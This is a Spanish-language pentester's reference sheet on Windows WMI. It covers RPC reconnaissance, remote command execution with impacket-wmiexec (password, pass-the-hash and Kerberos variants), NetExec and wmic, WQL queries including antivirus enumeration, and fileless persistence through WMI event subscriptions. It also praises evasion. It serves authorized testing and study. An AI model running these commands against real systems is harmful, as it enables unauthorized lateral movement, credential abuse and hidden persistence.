---
tipo: meta
aliases:
  - WMI - matriz
  - wmi cheatsheet
  - wmiexec - matriz
tags:
  - meta/referencia
  - dominio/red
---

# WMI - matriz de referencia

> [!info] Referencia pura, no un zettel
> **Puerto: 135/tcp** (RPC endpoint mapper / DCOM) + puertos altos dinámicos; también viaja sobre WinRM. Interfaz de administración de Windows: sirve para **ejecutar** (sin crear servicio, más sigiloso que psexec), **consultar** el sistema y **persistir**. Requiere admin local. Ejecución remota como movimiento lateral: [[AD movimiento lateral - matriz de referencia]]. Criterio de recon en [[MOC - Reconocimiento de red]].

`HOST`, `u`, `p`, `DOM` son marcadores.

## Reconocimiento

| Comando | Qué da |
|---|---|
| `nmap -sV -p135 HOST` | Detecta el endpoint mapper RPC |
| `impacket-rpcdump HOST` | Lista las interfaces RPC registradas |

## Ejecutar (wmiexec)

| Caso | Comando |
|---|---|
| Shell semi-interactiva | `impacket-wmiexec DOM/u:p@HOST` |
| Pass-the-hash | `impacket-wmiexec -hashes :NTHASH DOM/u@HOST` |
| Kerberos | `impacket-wmiexec -k -no-pass DOM/u@HOST` |
| Con NetExec | `nxc smb HOST -u u -p p -x 'whoami' --exec-method wmiexec` |
| Desde Windows | `wmic /node:HOST /user:DOM\u /password:p process call create "cmd /c calc"` |

`wmiexec` **no crea un servicio** (a diferencia de psexec): ejecuta por WMI y saca la salida por un share. Deja menos rastro, por eso es preferido para lateral.

## Consultar el sistema (WQL)

Desde Linux: `impacket-wmiquery DOM/u:p@HOST` y adentro WQL (`SELECT ... FROM ...`). Desde Windows: `wmic`.

| Qué | Clase WMI / comando |
|---|---|
| SO y versión | `Win32_OperatingSystem` |
| Procesos | `Win32_Process` |
| Servicios | `Win32_Service` |
| Usuarios y grupos | `Win32_UserAccount` · `Win32_Group` |
| Parches instalados | `Win32_QuickFixEngineering` |
| Software instalado | `Win32_Product` |
| Antivirus | `root\SecurityCenter2` → `AntiVirusProduct` |

Ejemplo WQL: `SELECT Name, ProcessId FROM Win32_Process`. En `wmic`: `wmic /node:HOST ... qfe get` (parches), `... os get` (SO).

## Persistencia por suscripción de eventos (fileless)

La persistencia clásica de WMI: no toca disco, dispara con un evento.

- `__EventFilter` — la condición (ej. arranque del sistema, cierto proceso).
- `CommandLineEventConsumer` — qué ejecuta.
- `__FilterToConsumerBinding` — une los dos.

Se arma con `Set-WmiInstance` en PowerShell, o herramientas como `Invoke-WmiEvent`. Sobrevive reinicios y no deja archivo — de las persistencias más difíciles de cazar.

## Configuraciones / requisitos

| Punto | Detalle |
|---|---|
| Requiere admin local | WMI remoto exige la cuenta con derechos administrativos en el destino |
| DCOM y RPC | El 135 abre, pero la conexión salta a un puerto alto dinámico — el firewall lo puede cortar |
| Firewall de Windows | La regla "Windows Management Instrumentation (WMI-In)" tiene que estar habilitada |

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `rpc_s_access_denied` | la cuenta no es admin en el destino | usar una cuenta administrativa |
| conecta a 135 y luego timeout | el puerto RPC dinámico está filtrado | probar wmiexec sobre otro canal, o WinRM |
| `wmiexec` sin salida | el share de salida no es accesible | usar `-silentcommand`, o cambiar de método de exec |
| PtH rechazado | hash mal formado | pasar solo el NT (`-hashes :NTHASH`) |
